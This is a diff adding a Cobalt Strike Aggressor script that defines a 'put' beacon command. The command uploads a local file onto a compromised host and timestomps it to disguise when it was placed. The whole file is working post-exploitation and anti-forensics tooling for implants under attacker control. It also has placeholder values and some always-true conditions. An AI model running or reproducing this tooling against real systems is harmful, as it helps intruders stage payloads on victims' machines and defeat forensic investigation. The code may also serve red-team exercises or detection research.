@@ -1,0 +1,183 @@
+#	ALIAS:	PUT
+
+import java.io.*;
+import java.nio.file.Paths;
+
+# $1 => Beacon Id
+# $2 => Parameter
+# $3 => Argument
+
+# put: Supporting Function(s)
+sub funct_put_argparse {
+	@param = @('-r','-t','-l');
+	if (iff($2 in @param, true, false)) {
+		if ($2 eq '-r') {
+			return %(idx => '1', arg => $3);
+		}
+		else if ($2 eq '-t') {
+			return %(idx => '2', arg => $3);
+		}
+		else if ($2 eq '-l') {
+			return %(idx => '3', arg => $3);
+		}
+	}
+	else {
+		return berror($1, "Not a valid Parameter; Allowed Parameters: -r, -t, -l");
+	}
+}
+
+alias("put", {
+		local('$bid %arg1 %arg2 %arg3');
+		global('@params $tchf $rmtf $lclf');
+			
+		# Check Num Arguments
+		if (size(@_) < 3) {
+			berror($1, "put: not enough parameters/arguments");
+			beacon_command_detail("put");
+			return;
+		}
+		else if (size(@_) > 7) {
+			berror($1, "put: too many parameter/arguments supplied");
+			beacon_command_detail("put");
+			return;
+		}
+		else if (size(@_) >= 3) {
+			if (iff("-r" in @_, false, true)) {
+				berror($1, "put: '-r' is a required parameter");
+				beacon_command_detail("put");
+				return;
+			}
+		}
+		
+		# Task
+		try {
+			
+			# Print Information to Beacon Console.
+			binput($1, "[ Uploading File to Target ]");
+			
+			# Beginning Task
+			btask($1, "Uploading File (MITRE ATTACK ID)", "T000");
+			
+			# Log Tasking to Event Log.
+			elog("\cC[+] Uploading File on Implant ID: \o" . beacon_info( $1 , "id" ) . " (" . beacon_info($1, "computer") . ")");
+			
+			# Print Information to Script Console.
+			println(
+				"\nPRINTED INFORMATION: PUT => "          . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\n\tUploading File (" . "PLACEHOLDER" . ") to Target."
+			);
+			
+			# Print Results to Beacon Console.
+			# Parse Arguments
+			%arg1 = funct_put_argparse($1, $2, $3);
+			push(@params, %arg1);
+			
+			if ($4 ne $null || $5 ne $null) {
+				%arg2 = funct_put_argparse($1, $4, $5);
+				push(@params, %arg2);
+			}
+			else {
+				%arg2 = %(idx => '2', arg => "");
+				push(@params, %arg2);
+			}
+			
+			if ($6 ne $null || $7 ne $null){
+				%arg3 = funct_put_argparse($1, $6, $7);
+				push(@params, %arg3);
+			}
+			else {
+				%arg3 = %(idx => '3', arg => "");
+				push(@params, %arg3);
+			}
+			
+			sort({ return $1['idx'] <=> $2['idx'];}, @params);
+			
+			foreach $argument (@params) {
+				if ($argument['idx'] eq '1'){
+					$rmtf = $argument['arg'];
+				}
+				else if ($argument['idx'] eq '2'){
+					if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+						$tchf = $argument['arg'];
+					}
+					else {
+						$tchf = $null;
+					}
+				}
+				else if ($argument['idx'] eq '3'){
+					if ($argument['arg'] ne $null || $argument['arg'] ne "") {
+						$lclf = $argument['arg'];
+					}
+					else {
+						$lclf = $null;
+					}
+				}
+			}
+			
+			# Main Code
+			if ( $lclf ne $null ) {
+				@rsplitfile = &split("\\\\", $rmtf);
+				$rfilename  = @rsplitfile[-1];
+				pop(@rsplitfile);
+				$rdirname   = join("\\\\", @rsplitfile);
+				$handle = openf($lclf);
+				$data = readb($handle, -1);
+				closef($handle);
+				bupload_raw($1, $rmtf, $data, $lclf);
+				if ( $tchf ne $null || $tchf ne "" ) {
+					try {
+						btimestomp($1, $rfilename, $tchf);
+					}
+					catch $exception{
+						berror($1, "Error: 2 (The system cannot find the file specified) {" . $exception . "}");
+					}
+				}
+			}
+			else {
+				prompt_file_open(
+					"Local Upload File",
+					$null,
+					false,
+					lambda({
+						$lf = $1;
+						@rsplitfile = &split("\\\\", $rf);
+						$rfilename  = @rsplitfile[-1];
+						pop(@rsplitfile);
+						$rdirname   = join("\\\\", @rsplitfile);
+						$handle = openf($lf);
+						$data = readb($handle, -1);
+						closef($handle);
+						bupload_raw($bid, $rf, $data, $lf);
+						if ( $tf != $null || $tf ne "" ) {
+							try {
+								btimestomp($bid, $rf, $tf);
+							}
+							catch $exception {
+								berror($bid, $exception);
+							}
+						}
+					}, $bid => $1, $rf => $rmtf, $tf => $tchf)
+				);
+			}
+		}
+		catch $exception {
+			
+			#Print Error to Script Console.
+			println(
+				"\nERROR INFORMATION: put => " . beacon_info($1, "id") . " (" . beacon_info($1, "computer") . ")"
+				. "\n\tFailed to Upload File: " . $exception
+			);
+			
+			# Print Error and Return.
+			berror($1, "put: " . $exception);
+			return;
+		}
+	}
+);
+
+#	ALIAS REGISTER: PUT
+beacon_command_register(
+	"put",
+	"\c2[*] ALIAS: Upload file onto Remote System and Timestomp\o",
+	"Synopsis: put -r <remote_file> [-t <touchfile>] [-l <localfile>]\n\nPut files on Remote system and Timestomp"
+);
